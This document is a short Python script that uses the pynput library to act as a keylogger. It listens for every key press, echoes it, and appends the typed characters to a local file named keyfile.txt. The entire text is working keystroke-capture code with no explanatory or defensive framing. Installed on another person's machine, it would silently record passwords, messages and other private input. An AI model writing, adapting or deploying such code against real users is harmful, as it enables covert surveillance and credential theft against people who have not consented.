from pynput import keyboard 

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey: 
        try: 
            char = key.char
            logKey.write(char)
        except:
            print("Error") 

if __name__ == "__main__":
    tracker = keyboard.Listener(on_press = keyPressed)
    tracker.start()
    input()
    